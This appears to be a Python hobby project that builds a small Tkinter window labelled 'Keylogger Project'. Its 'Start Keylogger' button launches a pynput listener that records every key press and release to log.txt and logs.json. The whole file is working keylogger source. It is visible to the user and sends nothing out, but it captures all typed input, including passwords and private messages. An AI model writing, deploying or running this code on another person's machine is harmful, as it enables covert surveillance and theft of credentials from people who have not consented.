import tkinter as tk
from pynput import keyboard
import json

def update_txt_file(key_strokes):
    with open('log.txt', 'w') as key_file:
        key_file.write(key_strokes)

def update_json_file(key_list):
    with open('logs.json', 'w') as log_file:
        json.dump(key_list, log_file)

def on_press(key):
    key_list.append({'Pressed': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    key_list.append({'Released': f'{key}'})
    update_json_file(key_list)

    global key_strokes
    key_strokes += str(key)
    update_txt_file(key_strokes)

def start_keylogger():
    print("[+] Running keylogger successfully!")
    print("[!] Saving the key logs in 'logs.json'")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

root = tk.Tk()
root.geometry("250x300")
root.title("Keylogger Project")

key_list = []
key_strokes = ""

empty_label = tk.Label(root, text=" ")
empty_label.grid(row=0, column=0, pady=5)
empty_label = tk.Label(root, text=" ")
empty_label.grid(row=1, column=0, pady=5)
empty_label = tk.Label(root, text="Keylogger", font='Verdana 11 bold')
empty_label.grid(row=2, column=1, pady=5)
empty_label = tk.Label(root, text=" ")
empty_label.grid(row=3, column=0, pady=5)
empty_label = tk.Label(root, text=" ")
empty_label.grid(row=4, column=0, pady=5)

start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
start_button.grid(row=5, column=1, pady=5)

root.mainloop()
